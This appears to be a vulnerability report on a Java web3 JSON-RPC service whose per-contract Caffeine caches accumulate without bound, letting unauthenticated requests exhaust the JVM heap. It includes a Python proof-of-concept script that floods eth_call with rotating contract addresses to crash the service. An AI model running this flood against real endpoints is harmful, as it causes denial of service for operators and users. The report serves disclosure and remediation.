### Title
Unbounded `CaffeineCache` Instance Accumulation in `cacheManagerSlotsPerContract` Leads to JVM Heap Exhaustion via Unauthenticated Requests

### Summary
`cacheManagerSlotsPerContract` is configured without `setCacheNames()`, placing it in dynamic mode where `CaffeineCacheManager` creates and permanently stores a new `CaffeineCache` instance in an internal unbounded `ConcurrentHashMap` for every unique cache name requested. Because `findStorageBatch()` calls `cacheManagerSlotsPerContract.getCache(contractId.toString())` with attacker-controlled contract IDs, and because eviction from the outer `contractSlotsCache` never removes entries from `cacheManagerSlotsPerContract`'s internal map, an unauthenticated attacker can drive unbounded accumulation of `CaffeineCache` objects, exhausting JVM heap and crashing the service.

### Finding Description

**Exact code path:**

`EvmConfiguration.java` lines 107–112 — `cacheManagerSlotsPerContract` is instantiated as a `CaffeineCacheManager` with only a cache spec set, and **no `setCacheNames()` call**:

```java
@Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
CaffeineCacheManager cacheManagerSlotsPerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
    return caffeineCacheManager;  // dynamic mode: no fixed cache names
}
``` [1](#0-0) 

Compare with every other `CaffeineCacheManager` bean in the same file, which all call `setCacheNames(Set.of(...))` to restrict dynamic creation: [2](#0-1) 

`ContractStateServiceImpl.java` lines 85–87 — `findStorageBatch()` calls `cacheManagerSlotsPerContract.getCache(contractId.toString())` inside a value-loader lambda for the outer `contractSlotsCache`:

```java
private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
    final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
            contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
``` [3](#0-2) 

**Root cause and failed assumption:**

Spring's `CaffeineCacheManager.getCache(name)` in dynamic mode stores every new `CaffeineCache` instance in an internal `ConcurrentHashMap<String, Cache> cacheMap` with **no eviction or size bound**. The design assumes the outer `contractSlotsCache` (from `cacheManagerContractSlots`, `maximumSize=3000`) acts as a gate. However, when the outer cache evicts an entry for a contractId (due to its own size limit), it does **not** call back into `cacheManagerSlotsPerContract` to remove the corresponding entry from its internal map. The `CaffeineCache` object remains strongly referenced inside `cacheManagerSlotsPerContract` indefinitely, preventing GC.

**Exploit flow:**

1. Attacker sends a stream of `eth_call` (or `eth_estimateGas`) requests, each using a distinct `to` address (contract address), cycling through more than 3000 unique values.
2. For each new contractId, `findStorage()` → `findStorageBatch()` → `cacheManagerSlotsPerContract.getCache(contractId.toString())` creates a new `CaffeineCache` and stores it in the internal map.
3. Once the outer `contractSlotsCache` reaches `maximumSize=3000`, it begins evicting old contractId entries. The evicted entries are gone from the outer cache, but their `CaffeineCache` objects remain in `cacheManagerSlotsPerContract`'s internal `ConcurrentHashMap`.
4. The attacker continues rotating through new contractIds. The internal map grows without bound: 3001, 10000, 100000+ entries.
5. Each `CaffeineCache` instance carries Caffeine's internal data structures (node arrays, scheduler references, etc.) even when empty. At scale this exhausts heap → `OutOfMemoryError` → JVM crash.

**Why existing checks fail:**

- `slotsPerContract = "expireAfterAccess=5m,maximumSize=1500"` — this `maximumSize` bounds the number of **slot keys within each per-contract cache**, not the number of `CaffeineCache` instances created. [4](#0-3) 
- `contractSlots = "expireAfterAccess=5m,maximumSize=3000"` — this bounds the outer cache, but outer-cache eviction has no side-effect on `cacheManagerSlotsPerContract`'s internal map. [5](#0-4) 
- No authentication or rate limiting guards the public JSON-RPC endpoints that trigger `findStorage`.

### Impact Explanation

An unauthenticated attacker can cause a complete JVM heap exhaustion of the web3 service. The service handles Ethereum-compatible JSON-RPC calls (eth_call, eth_estimateGas, eth_getStorageAt); a crash of this service means no new EVM transactions can be simulated or confirmed, constituting a total network-facing service outage. The attack is persistent: restarting the service restores the in-memory caches to zero, but the attacker can immediately repeat the flood.

### Likelihood Explanation

The attack requires only the ability to send HTTP requests to the public JSON-RPC endpoint — no credentials, no on-chain funds, no privileged access. Contract addresses are 20-byte values, giving an effectively unlimited supply of unique contractIds. A single attacker with a script sending requests in a tight loop can exhaust heap within minutes depending on JVM heap configuration. The attack is fully repeatable after each service restart.

### Recommendation

1. **Fix the root cause**: Call `setCacheNames()` on `cacheManagerSlotsPerContract` with a fixed set of names, or replace the dynamic per-contract cache pattern with a single two-level cache keyed by `(contractId, slotKey)`.
2. **If dynamic caches are required**: Maintain an explicit `ConcurrentHashMap` with a bounded size (e.g., backed by a Caffeine cache itself) and register a removal listener on the outer `contractSlotsCache` to evict the corresponding entry from `cacheManagerSlotsPerContract` when a contractId is evicted.
3. **Rate-limit** the JSON-RPC endpoint at the ingress layer (e.g., per-IP request rate limiting) to slow down the attack surface regardless of the cache fix.

### Proof of Concept

```python
import requests, threading, itertools, random

URL = "http://<web3-service-host>:8545"

def make_address(n):
    return "0x" + hex(n)[2:].zfill(40)

def send_eth_call(contract_addr):
    payload = {
        "jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": contract_addr, "data": "0x"}, "latest"],
        "id": 1
    }
    try:
        requests.post(URL, json=payload, timeout=5)
    except Exception:
        pass

# Rotate through >3000 unique contract addresses to overflow the outer cache
# and accumulate CaffeineCache instances in cacheManagerSlotsPerContract
threads = []
for i in itertools.count(1):
    addr = make_address(i)
    t = threading.Thread(target=send_eth_call, args=(addr,))
    t.start()
    threads.append(t)
    if len(threads) >= 50:
        for t in threads:
            t.join()
        threads = []
    # After ~3001+ unique addresses, outer cache evicts but inner map grows unboundedly
    # Monitor JVM heap: it will grow monotonically until OOM
```

Reproducible steps:
1. Start the web3 service with default configuration (`maximumSize=3000` for contractSlots, `maximumSize=1500` for slotsPerContract).
2. Run the script above, cycling through unique contract addresses beyond 3000.
3. Monitor JVM heap (e.g., via JMX or `-verbose:gc`): observe monotonic growth in `cacheManagerSlotsPerContract`'s internal map.
4. Service throws `OutOfMemoryError` and crashes once heap is exhausted.

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L67-73)
```java
    @Bean(CACHE_MANAGER_CONTRACT)
    CacheManager cacheManagerContract() {
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheNames(Set.of(CACHE_NAME_CONTRACT));
        caffeineCacheManager.setCacheSpecification(cacheProperties.getContract());
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/evm/config/EvmConfiguration.java (L107-112)
```java
    @Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
    CaffeineCacheManager cacheManagerSlotsPerContract() {
        final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
        caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
        return caffeineCacheManager;
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/service/ContractStateServiceImpl.java (L85-87)
```java
    private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
        final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
                contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L25-25)
```java
    private String contractSlots = "expireAfterAccess=5m,maximumSize=3000,recordStats";
```

**File:** web3/src/main/java/org/hiero/mirror/web3/repository/properties/CacheProperties.java (L39-39)
```java
    private String slotsPerContract = "expireAfterAccess=5m,maximumSize=1500";
```
